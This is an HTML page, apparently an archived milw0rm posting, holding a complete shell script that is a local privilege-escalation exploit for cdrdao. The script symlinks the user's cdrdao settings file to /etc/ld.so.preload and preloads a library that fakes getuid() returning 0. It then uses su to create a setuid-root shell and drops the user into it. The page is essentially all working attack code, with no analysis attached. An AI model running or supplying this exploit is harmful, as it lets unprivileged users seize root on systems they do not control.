<html><head><title>CDRDAO Local Root Exploit</title></head><pre>#!/bin/sh
DIR=`pwd`
echo &quot;&quot;
echo &quot;cdrdao local root exploit - gr doesn't protect you this time&quot;
echo &quot;Karol Wiêsek &lt;appelast*drumnbass.art.pl&gt;&quot;
echo &quot;&quot;
sleep 2
umask 000
echo -n &quot;[*] Checking if /etc/ld.so.preload doesn't exist ... &quot;
if [ -f /etc/ld.so.preload ]; then
echo &quot;WRONG&quot;
echo &quot;/etc/ld.so.preload exists, write another exploit ;P&quot;
exit
else
echo &quot;OK&quot;
fi
echo -n &quot;[*] Checking if su is setuid ... &quot;
if [ -u /bin/su ];then
echo &quot;OK&quot;
else
echo &quot;WRONG&quot;
exit
fi
echo -n &quot;[*] Creating evil *uid() library ... &quot;
cat &gt; getuid_lib.c &lt;&lt; _EOF
int getuid(void) {
return 0; }
_EOF
gcc -o getuid_lib.o -c getuid_lib.c
ld -shared -o getuid_lib.so getuid_lib.o
rm -f getuid_lib.c getuid_lib.o
if [ -f ./getuid_lib.so ]; then
echo &quot;OK&quot;
else
echo &quot;WRONG&quot;
fi
echo -n &quot;[*] Creating suidshell ... &quot;
cat &gt; suid.c &lt;&lt; _EOF
int main(void) {
setgid(0); setuid(0);
unlink(&quot;./suid&quot;);
execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0); }
_EOF
gcc -o suid suid.c
rm -f suid.c
if [ -x ./suid ];then
echo &quot;OK&quot;
else
echo &quot;WRONG&quot;
exit
fi
echo -n &quot;[*] Exploiting cdrdao ... &quot;
ln -sf /etc/ld.so.preload $HOME/.cdrdao
if [ ! -L $HOME/.cdrdao ];then
echo &quot;Could'n link to \$HOME/.cdrdao&quot;
exit
fi
cdrdao unlock --save 2&gt;/dev/null
&gt;/etc/ld.so.preload
echo &quot;$DIR/getuid_lib.so&quot; &gt; /etc/ld.so.preload
su - -c &quot;rm /etc/ld.so.preload; chown root:root $DIR/suid; chmod +s $DIR/suid&quot;
if [ -s ./suid ];then
echo &quot;OK&quot;
else
echo &quot;WRONG&quot;
exit
fi
rm -f getuid_lib.so
unlink $HOME/.cdrdao
echo &quot;Entering rootshell ... ;]&quot;
./suid

# milw0rm.com [2004-09-07]</pre></html>